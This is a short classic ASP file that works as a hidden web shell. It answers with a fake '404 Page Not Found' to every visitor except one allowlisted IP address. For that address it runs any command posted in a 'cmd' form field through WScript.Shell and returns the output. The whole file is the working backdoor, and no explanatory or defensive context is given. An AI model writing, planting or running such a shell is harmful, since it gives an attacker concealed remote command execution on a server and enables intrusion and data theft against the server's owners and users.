<%
ip = Request.ServerVariables("REMOTE_ADDR")
if ip <> "192.0.2.10" then
 response.Status = "404 Page Not Found"
 response.End
end if
cmd = Request.Form("cmd")
set wshell = CreateObject("WScript.Shell")
Set objCmd = wshell.Exec(cmd)
Response.Write objCmd.StdOut.ReadAll()
%>
